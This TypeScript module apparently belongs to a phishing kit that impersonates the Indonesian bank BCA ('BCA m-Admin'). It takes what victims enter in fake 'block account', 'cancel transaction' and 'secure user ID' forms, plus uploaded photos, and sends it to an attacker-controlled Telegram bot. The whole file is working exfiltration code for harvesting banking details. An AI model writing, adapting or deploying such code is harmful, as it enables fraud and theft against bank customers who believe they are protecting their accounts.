/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

export interface TelegramFormData {
  serviceType: 'blokir' | 'batalkan-transaksi' | 'amankan-bank-lain' | 'amankan-user-id';
  serviceTitle: string;
  timestamp: string;
  data: Record<string, string>;
}

export class TelegramService {
  private static botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
  private static chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
  private static apiUrl = 'https://api.telegram.org';

  /**
   * Format data untuk pesan Telegram
   */
  private static formatMessage(formData: TelegramFormData): string {
    const timestamp = new Date().toLocaleString('id-ID', {
      timeZone: 'Asia/Jakarta',
    });

    let message = `📋 *${formData.serviceTitle}*\n`;
    message += `━━━━━━━━━━━━━━━━━━━━\n`;
    message += `⏰ *Waktu:* ${timestamp}\n`;
    message += `📌 *Layanan:* ${formData.serviceType}\n`;
    message += `━━━━━━━━━━━━━━━━━━━━\n\n`;

    // Format data fields
    Object.entries(formData.data).forEach(([key, value]) => {
      if (value && value.trim() !== '') {
        const formattedKey = key
          .replace(/([A-Z])/g, ' $1')
          .replace(/^./, (str) => str.toUpperCase())
          .trim();
        message += `🔹 *${formattedKey}:* \`${value}\`\n`;
      }
    });

    message += `\n━━━━━━━━━━━━━━━━━━━━\n`;
    message += `✅ Data berhasil diterima dari BCA m-Admin\n`;

    return message;
  }

  /**
   * Kirim data form ke Telegram
   */
  static async sendFormData(formData: TelegramFormData): Promise<boolean> {
    try {
      // Validasi environment variables
      if (!this.botToken || !this.chatId) {
        console.warn(
          'Telegram configuration not set. Set VITE_TELEGRAM_BOT_TOKEN and VITE_TELEGRAM_CHAT_ID in .env'
        );
        return false;
      }

      const message = this.formatMessage(formData);

      const response = await fetch(
        `${this.apiUrl}/bot${this.botToken}/sendMessage`,
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: this.chatId,
            text: message,
            parse_mode: 'Markdown',
          }),
        }
      );

      if (!response.ok) {
        const errorData = await response.json();
        console.error('Telegram API Error:', errorData);
        return false;
      }

      console.log('✅ Data berhasil dikirim ke Telegram');
      return true;
    } catch (error) {
      console.error('❌ Error mengirim ke Telegram:', error);
      return false;
    }
  }

  /**
   * Kirim file/gambar ke Telegram
   */
  static async sendPhoto(
    photoBase64: string,
    caption: string
  ): Promise<boolean> {
    try {
      if (!this.botToken || !this.chatId) {
        console.warn(
          'Telegram configuration not set. Set VITE_TELEGRAM_BOT_TOKEN and VITE_TELEGRAM_CHAT_ID in .env'
        );
        return false;
      }

      // Convert base64 to blob
      const blobData = this.base64ToBlob(photoBase64);
      const formData = new FormData();
      formData.append('chat_id', this.chatId);
      formData.append('photo', blobData, 'bukti.jpg');
      formData.append('caption', caption);
      formData.append('parse_mode', 'Markdown');

      const response = await fetch(
        `${this.apiUrl}/bot${this.botToken}/sendPhoto`,
        {
          method: 'POST',
          body: formData,
        }
      );

      if (!response.ok) {
        const errorData = await response.json();
        console.error('Telegram API Error:', errorData);
        return false;
      }

      console.log('✅ Foto berhasil dikirim ke Telegram');
      return true;
    } catch (error) {
      console.error('❌ Error mengirim foto ke Telegram:', error);
      return false;
    }
  }

  /**
   * Helper: Convert base64 ke Blob
   */
  private static base64ToBlob(base64: string): Blob {
    const arr = base64.split(',');
    const mime = arr[0].match(/:(.*?);/)?.[1] || 'image/jpeg';
    const bstr = atob(arr[1]);
    const n = bstr.length;
    const u8arr = new Uint8Array(n);
    for (let i = 0; i < n; i++) {
      u8arr[i] = bstr.charCodeAt(i);
    }
    return new Blob([u8arr], { type: mime });
  }
}
